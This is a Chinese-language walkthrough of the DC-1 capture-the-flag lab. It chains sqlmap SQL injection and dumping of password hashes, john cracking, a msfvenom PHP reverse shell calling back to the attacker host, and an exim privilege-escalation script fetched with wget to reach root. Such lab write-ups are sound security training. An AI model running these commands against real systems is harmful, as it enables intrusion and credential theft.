
# 0x00环境

攻击机：kali：192.168.1.28

靶机DC-1：192.168.1.16


# 0x01实战


## 端口扫描

```
nmap -sV -A 192.168.1.16
```

![image-20220112164641097.png](./assets/1652257073736-8390267d-bcfa-418b-b640-463bff073dcf.png)


## 目录扫描

![image-20220112165133362.png](./assets/1652257077313-fb27c613-5af4-4c9f-ac5e-d0387bfb15ff.png)

查看robots.txt文件，发现后台等登录地址

![image-20220112165231585.png](./assets/1652257081676-3ff7a213-754d-45b5-87c5-fbc3be4f9fc8.png)


## 漏洞发现

漏洞发现在浏览页面的时候发现URL处可能存在SQL注入漏洞<br />添加单引号报错

![image-20220112165530031.png](./assets/1652257088726-6bf2b76d-b555-40b4-85ee-55fa01013825.png)


## 漏洞利用

使用sqlmap暴库

```
sqlmap http://192.168.1.16/?nid=1 --dbs
```

![image-20220112165729453.png](./assets/1652257095565-1cf1584a-6460-4476-8c51-0e66c6d7e88c.png)

暴表

```
sqlmap http://192.168.1.16/?nid=1 -D d7db --tables
```

![image-20220112165832577.png](./assets/1652257098999-2e3e888b-7371-46ef-b4ac-eea0376cd2a7.png)

暴字段

```
sqlmap http://192.168.1.16/?nid=1 -D d7db -T users --columns
```

![image-20220112165916653.png](./assets/1652257102535-098e9a30-fe51-4441-9619-1ebe3482a0ee.png)

拖库

```
sqlmap http://192.168.1.16/?nid=1 -D d7db -T users -C name,pass --dump
```

![image-20220112165958237.png](./assets/1652257106014-f3bd2e15-3835-4b12-acc9-b3649b8f9bfa.png)

将密码hash保存到password.txt中，使用john破解

```
john password.txt
```

![image-20220112170512393.png](./assets/1652257109218-31086dcd-7269-44b9-874f-7907569cc4f1.png)

得到john的的密码turtle

使用账户john登录后台，成功

![image-20220112170645473.png](./assets/1652257112439-56d63d7d-064e-4757-82b0-f7e1d5123018.png)

在浏览后台的时候发现我们可以加入PHP代码

![image-20220113091509192.png](./assets/1652257116005-5fa12f63-12d5-478b-8c6f-879128498525.png)


## 反弹shell

使用msfvenom生成一个php木马文件

```
msfvenom -p php/meterpreter/reverse_tcp  lhost=192.168.1.28 port=4444 -f raw
```

![image-20220113091917661.png](./assets/1652257123879-a669f2e7-8e4f-4d97-83a6-b7ab2baa9c0f.png)

创建恶意文件文件内容为生成的木马

![image-20220113092121416.png](./assets/1652257127135-c78b7446-53b1-40f8-a408-47589ef056c4.png)

创建监听

```
┌──(root💀kali)-[~]
└─# msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.1.28
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > run
```

在浏览器中访问木马文件就得知道木马文件所在的位置

![image-20220113092213870.png](./assets/1652257131873-07e3f95f-70a1-4767-8e29-3956f9f3f0d1.png)

通过发送邮件的方式来触发

![image-20220113093249554.png](./assets/1652257136266-a692299e-7c24-425e-80c8-0d939472b93c.png)

成功反弹shell

![image-20220113093312743.png](./assets/1652257140438-a65d0b15-740c-4ee4-844c-6a7fd64eaf02.png)


## 提权

查看系统信息

```
cat /proc/version
cat /etc/issue
```

![image-20220113093629200.png](./assets/1652257146731-454cd7ed-4aaa-40de-abe9-fe2d792b07df.png)

没有可以利用的

查找suid权限的程序

```
find / -user root -perm -4000 -print 2>/dev/null
```

![image-20220113093934660.png](./assets/1652257156808-6d2d94cc-9815-4a70-9e03-b1c5a6ec7793.png)

查找到exim存在可以利用的提权脚本

![image-20220113095547171.png](./assets/1652257164333-0891365b-a775-479a-ad92-8d25e9be4cba.png)

查看目标机exim的版本

```
/usr/sbin/exim4 --version
```

![image-20220113095641118.png](./assets/1652257168039-abfcdb2b-74c1-4125-a625-12a01c638efe.png)

查看脚本，有两种利用方法

![image-20220113100227439.png](./assets/1652257171088-34914758-b022-45d2-8336-ed04ca1c1f78.png)

vi查看一下脚本格式

![image-20220113100302641.png](./assets/1652257174322-ee9b9139-48d4-4493-8d9e-9476f584036a.png)

修改为linux格式

```
dos2unix 46996.sh
```

![image-20220113100419582.png](./assets/1652257178032-6a7f1d29-2797-4ff8-9865-90c354e3acc0.png)

使用python3创建HTTP服务

```
python3 -m http.server
```

![image-20220113100604530.png](./assets/1652257181577-51d286cf-71a6-4db7-ae3c-dcea99d37a25.png)

进入靶机的tmp目录下载脚本

```
 wget http://192.168.1.28:8000/46996.sh
```

![image-20220113100811617.png](./assets/1652257184205-d8a86aab-7918-49b5-813e-7f5a25c9e357.png)

赋予脚本执行权限，并执行

```
chmod +x 46996.sh
./46996 -m netcat
```

![image-20220113102615811.png](./assets/1652257187652-554e621e-6a76-438e-adc9-9a0e6a4dd93f.png)


## final-flag

在root根目录找到flag

![image-20220113102838585.png](./assets/1652257193325-aa099054-7e22-47c4-9f7e-28cbfc338189.png)
